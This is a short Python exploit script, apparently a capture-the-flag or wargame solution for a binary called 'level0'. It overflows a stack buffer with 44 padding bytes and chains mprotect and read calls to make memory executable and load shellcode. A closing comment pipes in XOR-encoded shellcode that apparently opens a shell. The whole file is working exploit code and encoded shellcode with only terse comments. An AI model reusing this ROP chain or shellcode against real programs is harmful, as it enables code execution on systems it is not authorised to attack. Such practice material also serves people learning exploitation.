#!/usr/bin/python                                 
														  
import struct                                     
													  
def p(x):                                         
	return struct.pack('<L',x)                

mprotect=0x080523e0
read=0x080517f0
pop3ret=0x08048882

mem=0x080ca000
payload=""                                        

for i in xrange(44):                              
	payload+='A'                              

payload+=p(mprotect)   #mprotect systemcall                           
payload+=p(pop3ret)    #return address for mprotect  -> Align the stack
payload+=p(mem)        #address of memory region
payload+=p(0x1000)     #length  
payload+=p(0x7)        #protocol R|W|X                                  

payload+=p(read)	   #pop3ret return address
payload+=p(mem)		   #read return address -> We jump in our shellcode
payload+=p(0x0)		   #fd=0 for stdin
payload+=p(mem)		   #buffer where save data
payload+=p(0x100)	   #Number of byte to read

print payload 

#Execute with command:
#(python exp.py; python -c 'print "\xeb\x10\x5e\x31\xc9\xb1\x15\x8a\x06\x34\xe9\x88\x06\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xd8\x20\xb8\x81\xc6\xc6\x9a\x81\x81\xc6\x8b\x80\x87\x60\x0a\x83\xe2\xb1\x70\x24\x69"'; cat) | ./ level0
